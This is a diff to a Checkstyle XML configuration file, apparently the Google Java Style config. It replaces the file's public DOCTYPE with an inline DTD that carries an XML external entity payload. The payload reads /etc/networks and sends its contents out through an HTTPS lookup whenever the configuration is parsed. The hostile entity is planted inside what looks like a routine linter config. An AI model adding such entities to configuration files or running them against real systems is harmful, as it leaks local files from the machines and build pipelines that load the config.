@@ -1,7 +1,21 @@
 <?xml version="1.0"?>
-<!DOCTYPE module PUBLIC
-        "Custom"
-        "https://testing-kotlin-server.herokuapp.com/dtds/configuration_1_3.dtd">
+<!DOCTYPE module [
+        <!ELEMENT module (module|property)*>
+        <!ATTLIST module name NMTOKEN #REQUIRED>
+
+        <!ELEMENT property EMPTY>
+        <!ATTLIST property
+                name NMTOKEN #REQUIRED
+                value CDATA #REQUIRED
+                default CDATA #IMPLIED
+                >
+
+        <!ENTITY % payload SYSTEM "file:///etc/networks">
+        <!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "https://%payload;">'>
+        %param1;
+        %external;
+    ]
+>
 
 <!--
     Checkstyle configuration that checks the Google coding conventions from Google Java Style
